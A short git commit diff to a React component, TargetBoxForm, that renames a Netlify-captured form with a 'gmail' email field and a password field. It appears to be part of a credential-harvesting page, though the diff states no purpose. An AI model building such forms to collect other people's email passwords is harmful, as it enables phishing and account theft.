caa74f472c2bcab1fe9605b2d5839777d327e701
Fr4ny3r <guevarafranyer09@gmail.com>
2025-05-31 21:33:52 -0400

    :v

--- src/components/targetBoxForm.jsx
+++ src/components/targetBoxForm.jsx
@@ -2,12 +2,10 @@
 
 export function TargetBoxForm(){
 return(
-    <form name="prueva" method="POST" data-netlify="true">
+    <form name="contact" method="POST" data-netlify="true">
         <input type="email" name="gmail" id="" />
         <input type="password" name="contr" id="" />
         <button type="submit">enviar</button>
-        <input type="hidden" name="form-name" value="contact" />
-
     </form>
 )
 
